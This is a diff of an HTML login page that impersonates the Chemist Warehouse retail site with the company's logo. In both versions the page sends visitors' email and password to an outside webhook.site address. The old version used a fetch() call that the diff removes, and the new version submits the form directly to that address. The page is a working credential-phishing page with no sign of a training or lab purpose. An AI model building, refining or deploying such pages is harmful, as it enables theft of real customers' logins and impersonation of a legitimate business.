@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Chemist Warehouse Login</title>
   <style>
+    /* Your original styles here (omitted for brevity) */
     body {
       font-family: Arial, sans-serif;
       margin: 0;
@@ -20,7 +21,7 @@
       background-color: #fff;
       padding: 40px;
       border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
       text-align: center;
       width: 100%;
       max-width: 400px;
@@ -83,88 +84,46 @@
 </head>
 <body>
   <div class="login-container">
-    <img
-      src="https://images.ctfassets.net/hzgho8wo5m1w/3YprSv1x1a97SPwHeVAjHp/5a756f989347dd7a563994bf551986c2/Chemist_Warehouse_logo_-_We_beat_lockup.svg?w=1920&q=100"
-      alt="Chemist Warehouse Logo"
-    />
+    <img src="https://images.ctfassets.net/hzgho8wo5m1w/3YprSv1x1a97SPwHeVAjHp/5a756f989347dd7a563994bf551986c2/Chemist_Warehouse_logo_-_We_beat_lockup.svg?w=1920&q=100" alt="Chemist Warehouse Logo" />
     <h2>Welcome</h2>
     <p>Log in to Chemist Warehouse Retail</p>
 
     <form id="login-form" action="https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb" method="POST">
-      <input
-        id="email"
-        name="email"
-        type="email"
-        placeholder="Email address*"
-        required
-      />
-
+      <input id="email" name="email" type="email" placeholder="Email address*" required />
       <div id="password-container">
-        <input
-          id="password"
-          name="password"
-          type="password"
-          placeholder="Password*"
-          required
-        />
+        <input id="password" name="password" type="password" placeholder="Password*" required />
       </div>
-
       <button id="continue-btn" type="button">Continue</button>
     </form>
 
     <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
   </div>
-<script>
-  const emailInput = document.getElementById('email');
-  const passwordContainer = document.getElementById('password-container');
-  const continueBtn = document.getElementById('continue-btn');
-  const passwordInput = document.getElementById('password');
 
-  continueBtn.addEventListener('click', () => {
-    if (!passwordContainer.style.display || passwordContainer.style.display === 'none') {
-      if (emailInput.checkValidity()) {
-        passwordContainer.style.display = 'block';
-        emailInput.disabled = true;
-        passwordInput.focus();
-        continueBtn.textContent = 'Log In';
-      } else {
-        emailInput.reportValidity();
-      }
-    } else {
-      if (passwordInput.value.length === 0) {
-        passwordInput.reportValidity();
-        return;
-      }
+  <script>
+    const emailInput = document.getElementById('email');
+    const passwordContainer = document.getElementById('password-container');
+    const continueBtn = document.getElementById('continue-btn');
+    const passwordInput = document.getElementById('password');
+    const form = document.getElementById('login-form');
 
-      // Prepare data to send
-      const data = {
-        email: emailInput.value,
-        password: passwordInput.value
-      };
-
-      // Send to webhook.site
-      fetch('https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert(`Logging in with:\nEmail: ${emailInput.value}\nPassword: ${'*'.repeat(passwordInput.value.length)}\n\nData sent to webhook.`);
+    continueBtn.addEventListener('click', () => {
+      if (passwordContainer.style.display === 'none') {
+        if (emailInput.checkValidity()) {
+          passwordContainer.style.display = 'block';
+          emailInput.disabled = true;
+          passwordInput.focus();
+          continueBtn.textContent = 'Log In';
         } else {
-          alert('Failed to send data to webhook.');
+          emailInput.reportValidity();
         }
-      })
-      .catch(error => {
-        alert('Error sending data: ' + error);
-      });
-    }
-  });
-</script>
+      } else {
+        if (!passwordInput.value) {
+          passwordInput.reportValidity();
+          return;
+        }
+        form.submit();
+      }
+    });
+  </script>
 </body>
 </html>
-
-
-
